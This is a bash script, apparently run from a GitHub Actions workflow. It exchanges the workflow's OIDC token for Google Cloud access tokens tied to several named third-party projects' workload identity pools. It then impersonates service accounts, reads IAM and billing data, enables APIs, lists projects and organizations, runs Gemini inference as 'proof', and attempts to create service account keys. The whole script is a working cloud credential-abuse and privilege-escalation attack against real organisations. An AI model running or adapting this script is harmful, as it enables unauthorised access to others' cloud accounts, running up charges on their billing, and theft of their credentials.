set +e
jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
jq -n '{options:{requestedPolicyVersion:3}}' > polreq.json
jq -n '{contents:[{role:"user",parts:[{text:"hi"}]}],generationConfig:{maxOutputTokens:1}}' > genreq.json
jq -n '{contents:[{role:"user",parts:[{text:"say hi"}]}]}' > cntreq.json

mint_fed() { # prj -> writes tok.jwt, echoes STS code+token to ft.txt
  local PRJ="$1"
  : > tok.jwt
  local J=""
  for a in 1 2 3; do
    J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$PRJ")
    echo "$J" | jq -r '.value // empty' > tok.jwt
    [ -s tok.jwt ] && break
    sleep 3
  done
  if [ ! -s tok.jwt ]; then echo "##MINT_FAIL prj=$PRJ"; return 1; fi
  local c
  c=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
    -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
    --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
    --data-urlencode "subject_token=$(cat tok.jwt)" \
    -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
    -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
    -d "scope=https://www.googleapis.com/auth/cloud-platform")
  jq -r '.access_token // empty' r.json > ft.txt
  echo "##STS prj=$PRJ code=$c ftlen=$(wc -c < ft.txt) body=$(head -c 260 r.json | tr -d '\n' | tr -s ' ')"
  [ -s ft.txt ]
}
gen_sa() { # sa tokfile outfile label
  local SA="$1" TOK="$2" OUT="$3" LBL="$4" c
  c=$(curl -s -o "$OUT" -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
  jq -r '.accessToken // empty' "$OUT" > "${OUT}.tok"
  echo "##GEN label=$LBL sa=$SA code=$c toklen=$(wc -c < "${OUT}.tok") body=$(head -c 260 "$OUT" | tr -d '\n' | tr -s ' ')"
}
getp() { # label url tok
  local L="$1" U="$2" T="$3" c B
  c=$(curl -s -o p.json -w '%{http_code}' -H "Authorization: Bearer $T" "$U")
  B=$(head -c 400 p.json | tr -d '\n' | tr -s ' ')
  echo "##GET label=$L code=$c body=$B"
}
postp() { # label url tok file
  local L="$1" U="$2" T="$3" F="$4" c
  c=$(curl -s -o q.json -w '%{http_code}' -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" "$U" -d @"$F")
  echo "##POST label=$L code=$c body=$(head -c 700 q.json | tr -d '\n' | tr -s ' ')"
}
show_policy() { # label file
  local L="$1" F="$2"
  echo "##POLICY_SUMMARY label=$L bindings=$(jq -r '(.bindings // []) | length' "$F" 2>/dev/null) etag=$(jq -r '.etag // ""' "$F" 2>/dev/null)"
  jq -r '(.bindings // []) | to_entries[] | "##BIND label='"$L"' i=\(.key) role=\(.value.role) cond=\((.value.condition.expression // "-")|tostring) members=\((.value.members // [])|join(","))"' "$F" 2>/dev/null | head -c 12000
  echo ""
}

################ PHASE A: aryeelab 303574531351 ################
NUM=303574531351
PRJ="projects/$NUM/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider"
mint_fed "$PRJ" || { echo "##ABORT_A"; exit 0; }
FT=$(cat ft.txt)
gen_sa "github-actions@aryeelab.iam.gserviceaccount.com" "$FT" gat.json "aryeelab-github-actions"
GAT=$(cat gat.json.tok)
gen_sa "$NUM-compute@developer.gserviceaccount.com" "$GAT" eat.json "aryeelab-compute-editor"
EAT=$(cat eat.json.tok)

# ---- A1 IAM reads with the CORRECT POST method ----
if [ -n "$GAT" ]; then
  pc=$(curl -s -o pol_gat.json -w '%{http_code}' -X POST -H "Authorization: Bearer $GAT" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" -d @polreq.json)
  echo "##IAM_PROJECT code=$pc tok=GAT"
  show_policy "proj-GAT" pol_gat.json
  sc=$(curl -s -o sapol_gat.json -w '%{http_code}' -X POST -H "Authorization: Bearer $GAT" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/github-actions@aryeelab.iam.gserviceaccount.com:getIamPolicy" -d @polreq.json)
  echo "##IAM_SA code=$sc tok=GAT sa=github-actions@aryeelab"
  show_policy "sa-GAT" sapol_gat.json
  ac=$(curl -s -o adm_gat.json -w '%{http_code}' -H "Authorization: Bearer $GAT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts?pageSize=100")
  echo "##SALIST code=$ac emails=$(jq -r '[.accounts[]?.email]|join(",")' adm_gat.json 2>/dev/null)"
fi
if [ -n "$EAT" ]; then
  pc=$(curl -s -o pol_eat.json -w '%{http_code}' -X POST -H "Authorization: Bearer $EAT" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" -d @polreq.json)
  echo "##IAM_PROJECT code=$pc tok=EAT"
  show_policy "proj-EAT" pol_eat.json
  sc=$(curl -s -o sapol_eat.json -w '%{http_code}' -X POST -H "Authorization: Bearer $EAT" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/github-actions@aryeelab.iam.gserviceaccount.com:getIamPolicy" -d @polreq.json)
  echo "##IAM_SA code=$sc tok=EAT sa=github-actions@aryeelab"
  show_policy "sa-EAT" sapol_eat.json
fi

# ---- A2 serviceusage: enable cloudbilling + aiplatform ----
TOK=$EAT; [ -z "$TOK" ] && TOK=$GAT
svc_enabled() {
  local S="$1" c st
  c=$(curl -s -o s0.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://serviceusage.googleapis.com/v1/projects/$NUM/services/$S")
  st=$(jq -r '.state // "?"' s0.json 2>/dev/null)
  echo "##SVC_STATE svc=$S code=$c state=$st body=$(head -c 300 s0.json | tr -d '\n' | tr -s ' ')"
}
svc_enable() {
  local S="$1" c OP d e
  c=$(curl -s -o op.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d '{}' "https://serviceusage.googleapis.com/v1/projects/$NUM/services/$S:enable")
  OP=$(jq -r '.name // empty' op.json 2>/dev/null)
  echo "##SVC_ENABLE svc=$S code=$c op=$OP body=$(head -c 500 op.json | tr -d '\n' | tr -s ' ')"
  if [ -n "$OP" ]; then
    for i in $(seq 1 18); do
      curl -s -o op2.json -H "Authorization: Bearer $TOK" "https://serviceusage.googleapis.com/v1/$OP"
      d=$(jq -r '.done // false' op2.json 2>/dev/null); e=$(jq -r '.error.code // empty' op2.json 2>/dev/null)
      echo "##SVC_OPPOLL svc=$S i=$i done=$d err=$e body=$(head -c 400 op2.json | tr -d '\n' | tr -s ' ')"
      [ "$d" = "true" ] && break
      sleep 10
    done
  fi
  svc_enabled "$S"
}
svc_enabled cloudbilling.googleapis.com
svc_enable cloudbilling.googleapis.com
svc_enabled aiplatform.googleapis.com
svc_enable aiplatform.googleapis.com
ec=$(curl -s -o svclist.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://serviceusage.googleapis.com/v1/projects/$NUM/services?filter=state:ENABLED&pageSize=200")
echo "##SVC_ENABLED_LIST code=$ec count=$(jq -r '(.services // [])|length' svclist.json 2>/dev/null) names=$(jq -r '[.services[]?.config.name]|join(",")' svclist.json 2>/dev/null | head -c 3000)"

# ---- A3 billing reads ----
b1=$(curl -s -o b1.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo")
echo "##BILLING_V1 code=$b1 body=$(head -c 600 b1.json | tr -d '\n' | tr -s ' ')"
b2=$(curl -s -o b2.json -w '%{http_code}' -H "Authorization: Bearer $TOK" -H "x-goog-user-project: $NUM" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo")
echo "##BILLING_V1_USERPROJECT code=$b2 body=$(head -c 600 b2.json | tr -d '\n' | tr -s ' ')"
b3=$(curl -s -o b3.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://cloudbilling.googleapis.com/v1beta/projects/$NUM/billingInfo")
echo "##BILLING_V1BETA code=$b3 body=$(head -c 600 b3.json | tr -d '\n' | tr -s ' ')"
BA=$(jq -r '.billingAccountName // empty' b1.json 2>/dev/null)
echo "##BILLING_FIELDS billingAccountName=$BA billingEnabled=$(jq -r '.billingEnabled // empty' b1.json 2>/dev/null)"
blc=$(curl -s -o bl.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://cloudbilling.googleapis.com/v1/billingAccounts?pageSize=100")
echo "##BILLING_ACCOUNTS_LIST code=$blc body=$(head -c 800 bl.json | tr -d '\n' | tr -s ' ')"
if [ -n "$BA" ]; then
  ac=$(curl -s -o ba.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://cloudbilling.googleapis.com/v1/$BA")
  echo "##BILLING_ACCOUNT code=$ac body=$(head -c 800 ba.json | tr -d '\n' | tr -s ' ')"
  apc=$(curl -s -o bap.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://cloudbilling.googleapis.com/v1/$BA/projects")
  echo "##BILLING_ACCOUNT_PROJECTS code=$apc body=$(head -c 900 bap.json | tr -d '\n' | tr -s ' ')"
  bbc=$(curl -s -o bbc.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://billingbudgets.googleapis.com/v1/billingAccounts/${BA#billingAccounts/}/budgets")
  echo "##BUDGETS code=$bbc body=$(head -c 600 bbc.json | tr -d '\n' | tr -s ' ')"
fi

# ---- A4 project hierarchy ----
pj=$(curl -s -o pj.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM")
echo "##PROJECT_GET code=$pj body=$(head -c 600 pj.json | tr -d '\n' | tr -s ' ')"
PAR=$(jq -r '.parent.id // empty' pj.json 2>/dev/null); PART=$(jq -r '.parent.type // empty' pj.json 2>/dev/null)
echo "##PROJECT_PARENT type=$PART id=$PAR"
if [ "$PART" = "folder" ] && [ -n "$PAR" ]; then
  fc=$(curl -s -o f.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://cloudresourcemanager.googleapis.com/v2/folders/$PAR")
  echo "##FOLDER_GET code=$fc body=$(head -c 500 f.json | tr -d '\n' | tr -s ' ')"
  fpc=$(curl -s -o fp.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/folders/$PAR:getIamPolicy" -d @polreq.json)
  echo "##FOLDER_POLICY code=$fpc body=$(head -c 800 fp.json | tr -d '\n' | tr -s ' ')"
fi
if [ "$PART" = "organization" ] && [ -n "$PAR" ]; then
  oc=$(curl -s -o o.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://cloudresourcemanager.googleapis.com/v1/organizations/$PAR")
  echo "##ORG_GET code=$oc body=$(head -c 500 o.json | tr -d '\n' | tr -s ' ')"
fi
fld=$(curl -s -o fld.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://cloudresourcemanager.googleapis.com/v2/folders?parent=organizations/$PAR")
echo "##FOLDER_LIST code=$fld body=$(head -c 400 fld.json | tr -d '\n' | tr -s ' ')"
orgs=$(curl -s -o orgs.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "https://cloudresourcemanager.googleapis.com/v1/organizations")
echo "##ORG_LIST code=$orgs body=$(head -c 400 orgs.json | tr -d '\n' | tr -s ' ')"
# projects.list paged (editor token)
: > projects.txt
PT=""
for p in $(seq 1 12); do
  U="https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=100"
  [ -n "$PT" ] && U="$U&pageToken=$PT"
  plc=$(curl -s -o pl.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "$U")
  cnt=$(jq -r '(.projects // [])|length' pl.json 2>/dev/null)
  echo "##PROJECTS_LIST page=$p code=$plc count=$cnt"
  jq -r '(.projects // [])[] | "\(.projectId)\t\(.projectNumber)\t\(.state)\t\(.lifecycleState // "")"' pl.json >> projects.txt 2>/dev/null
  PT=$(jq -r '.nextPageToken // empty' pl.json 2>/dev/null)
  [ -z "$PT" ] && break
done
echo "##PROJECTS_TOTAL $(wc -l < projects.txt)"

# ---- A5 inference proof on gemini-2.0-flash ----
for U in \
  "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/publishers/google/models/gemini-2.0-flash:generateContent" \
  "https://us-central1-aiplatform.googleapis.com/v1beta/projects/$NUM/locations/us-central1/publishers/google/models/gemini-2.0-flash:generateContent" \
  "https://aiplatform.googleapis.com/v1/projects/$NUM/locations/global/publishers/google/models/gemini-2.0-flash:generateContent" ; do
  c=$(curl -s -o gc.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" "$U" -d @genreq.json)
  echo "##GENERATE_CONTENT code=$c url=$U body=$(head -c 500 gc.json | tr -d '\n' | tr -s ' ')"
done
for U in \
  "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/publishers/google/models/gemini-2.0-flash:countTokens" \
  "https://us-central1-aiplatform.googleapis.com/v1beta/projects/$NUM/locations/us-central1/publishers/google/models/gemini-2.0-flash:countTokens" ; do
  c=$(curl -s -o ct.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" "$U" -d @cntreq.json)
  echo "##COUNT_TOKENS code=$c url=$U body=$(head -c 400 ct.json | tr -d '\n' | tr -s ' ')"
done
for REG in us-central1 europe-west1 global; do
  if [ "$REG" = "global" ]; then U2="https://aiplatform.googleapis.com/v1/projects/$NUM/locations/global/models?pageSize=100"; else U2="https://$REG-aiplatform.googleapis.com/v1/projects/$NUM/locations/$REG/models?pageSize=100"; fi
  c=$(curl -s -o m_$REG.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "$U2")
  echo "##MODELS reg=$REG code=$c count=$(jq -r '(.models // [])|length' m_$REG.json 2>/dev/null) names=$(jq -r '[.models[]?.name]|join(",")' m_$REG.json 2>/dev/null | head -c 1500)"
done

# ---- A6 key creation attempt (deliverable format), delete if created ----
for SA in github-actions@aryeelab.iam.gserviceaccount.com $NUM-compute@developer.gserviceaccount.com; do
  kc=$(curl -s -o k.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" -d @keyreq.json)
  KN=$(jq -r '.name // empty' k.json 2>/dev/null)
  echo "##KEYCREATE sa=$SA code=$kc keyname=$KN pklen=$(jq -r '.privateKeyData // "" | length' k.json 2>/dev/null) body=$(head -c 300 k.json | tr -d '\n' | tr -s ' ')"
  if [ -n "$KN" ]; then
    dkc=$(curl -s -o dk.json -w '%{http_code}' -X DELETE -H "Authorization: Bearer $TOK" "https://iam.googleapis.com/v1/$KN")
    echo "##KEYDELETE name=$KN code=$dkc"
  fi
done

################ PHASE B: cross-identity IAM + projects ################
do_identity() { # num provider sa label
  local N="$1" P="$2" S="$3" L="$4" F T2 A2
  echo "##=== IDENTITY $L num=$N sa=$S"
  : > tok.jwt
  for a in 1 2 3; do
    curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$P" | jq -r '.value // empty' > tok.jwt
    [ -s tok.jwt ] && break; sleep 3
  done
  [ -s tok.jwt ] || { echo "##MINT_FAIL $L"; return; }
  local c
  c=$(curl -s -o r2.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
    -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
    --data-urlencode "audience=//iam.googleapis.com/$P" \
    --data-urlencode "subject_token=$(cat tok.jwt)" \
    -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
    -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
    -d "scope=https://www.googleapis.com/auth/cloud-platform")
  F=$(jq -r '.access_token // empty' r2.json)
  echo "##STS $L code=$c ftlen=${#F} body=$(head -c 220 r2.json | tr -d '\n' | tr -s ' ')"
  [ -n "$F" ] || return
  local gc
  gc=$(curl -s -o g2.json -w '%{http_code}' -X POST -H "Authorization: Bearer $F" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$S:generateAccessToken" -d @req.json)
  A2=$(jq -r '.accessToken // empty' g2.json)
  echo "##GEN $L sa=$S code=$gc toklen=${#A2} body=$(head -c 220 g2.json | tr -d '\n' | tr -s ' ')"
  [ -n "$A2" ] || A2="$F"
  local pc
  pc=$(curl -s -o p2.json -w '%{http_code}' -X POST -H "Authorization: Bearer $A2" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/$N:getIamPolicy" -d @polreq.json)
  echo "##IAM_PROJECT $L code=$pc"
  show_policy "$L" p2.json
  local sc
  sc=$(curl -s -o s2.json -w '%{http_code}' -X POST -H "Authorization: Bearer $A2" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$N/serviceAccounts/$S:getIamPolicy" -d @polreq.json)
  echo "##IAM_SA $L code=$sc"
  show_policy "$L-SA" s2.json
  local pg
  pg=$(curl -s -o pg.json -w '%{http_code}' -H "Authorization: Bearer $A2" "https://cloudresourcemanager.googleapis.com/v1/projects/$N")
  echo "##PROJECT_GET $L code=$pg body=$(head -c 400 pg.json | tr -d '\n' | tr -s ' ')"
  local bb mm
  bb=$(curl -s -o bb.json -w '%{http_code}' -H "Authorization: Bearer $A2" "https://cloudbilling.googleapis.com/v1/projects/$N/billingInfo")
  echo "##BILLING $L code=$bb body=$(head -c 400 bb.json | tr -d '\n' | tr -s ' ')"
  for REG in us-central1 europe-west1 global; do
    if [ "$REG" = "global" ]; then mm="https://aiplatform.googleapis.com/v1/projects/$N/locations/global/models"; else mm="https://$REG-aiplatform.googleapis.com/v1/projects/$N/locations/$REG/models"; fi
    local mc
    mc=$(curl -s -o mm.json -w '%{http_code}' -H "Authorization: Bearer $A2" "$mm")
    echo "##MODELS $L reg=$REG code=$mc count=$(jq -r '(.models // [])|length' mm.json 2>/dev/null)"
  done
  local pl
  pl=$(curl -s -o pl2.json -w '%{http_code}' -H "Authorization: Bearer $A2" "https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=100")
  echo "##PROJECTS_LIST $L code=$pl count=$(jq -r '(.projects // [])|length' pl2.json 2>/dev/null) ids=$(jq -r '[.projects[]?.projectId]|join(",")' pl2.json 2>/dev/null | head -c 2500)"
  local ec
  ec=$(curl -s -o sv2.json -w '%{http_code}' -H "Authorization: Bearer $A2" "https://serviceusage.googleapis.com/v1/projects/$N/services?filter=state:ENABLED&pageSize=200")
  echo "##SVC_ENABLED $L code=$ec names=$(jq -r '[.services[]?.config.name]|join(",")' sv2.json 2>/dev/null | head -c 2000)"
}
do_identity 363590592857 "projects/363590592857/locations/global/workloadIdentityPools/github-action/providers/github" "363590592857-compute@developer.gserviceaccount.com" "p363590592857"
do_identity 731679007643 "projects/731679007643/locations/global/workloadIdentityPools/github-actions/providers/rails-todo-identity-pool-github" "github-actions@rails-todo-app-386721.iam.gserviceaccount.com" "p731679007643"

################ PHASE C: goal battery over every listed project ################
if [ -s projects.txt ]; then
  cat > screen.py <<'PY'
import json,sys,urllib.request,urllib.error,concurrent.futures,os
tok=open('eat.json.tok').read().strip() or open('gat.json.tok').read().strip()
lines=[l.split('\t') for l in open('projects.txt').read().splitlines() if l.strip()]
def call(url):
    r=urllib.request.Request(url,headers={'Authorization':'Bearer '+tok})
    try:
        with urllib.request.urlopen(r,timeout=20) as resp:
            return resp.status, resp.read(400).decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode('utf-8','replace')
    except Exception as e:
        return 0, str(e)[:200]
def one(row):
    pid,num,state=row[0],row[1],row[2] if len(row)>2 else ''
    out=[pid,num,state]
    c,b=call(f'https://cloudbilling.googleapis.com/v1/projects/{num}/billingInfo')
    out.append(f'bill={c}:{b[:200]}')
    hits=[]
    for reg,host in (('us-central1','us-central1-aiplatform.googleapis.com'),('europe-west1','europe-west1-aiplatform.googleapis.com'),('global','aiplatform.googleapis.com')):
        mc,mb=call(f'https://{host}/v1/projects/{num}/locations/{reg}/models?pageSize=50')
        out.append(f'm_{reg}={mc}')
        if mc==200: hits.append(reg+':'+mb[:200])
    return ('##SCREEN pid=%s num=%s state=%s %s HITS=%s'%(pid,num,state,' '.join(out[3:]),'|'.join(hits)))
with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
    for line in ex.map(one,lines):
        print(line,flush=True)
PY
  python3 screen.py | tee screen_out.txt | head -700
  echo "##SCREEN_LINES $(wc -l < screen_out.txt)"
  echo "##SCREEN_HITS $(grep -c 'HITS=.\+' screen_out.txt)"
  grep 'HITS=.' screen_out.txt | head -20
fi
echo "##FINISHED943"

